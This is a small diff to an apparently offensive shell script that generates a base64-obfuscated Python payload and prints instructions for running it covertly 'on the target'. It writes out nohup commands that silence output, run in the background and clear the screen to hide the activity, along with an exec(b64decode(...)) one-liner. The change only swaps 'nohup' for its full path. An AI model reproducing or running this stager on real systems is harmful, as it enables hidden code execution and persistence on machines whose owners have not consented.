@@ -12,14 +12,14 @@ echo "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8
 echo ""
 echo "[+] Transfer $name.py to the target and execute it using python:"
 echo "..."
-echo 'nohup python '"$name.py"' &>/dev/null & clear && exit'
+echo '/usr/bin/nohup python '"$name.py"' &>/dev/null & clear && exit'
 echo "..."
 echo ""
 echo "    OR"
 echo ""
 echo "[+] Execute the following on the target :"
 echo "..."
-echo -n 'nohup python -c "'
+echo -n '/usr/bin/nohup python -c "'
 echo -n "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('$payload')[0]))"
 echo '" &>/dev/null & clear && exit'
 echo "..."
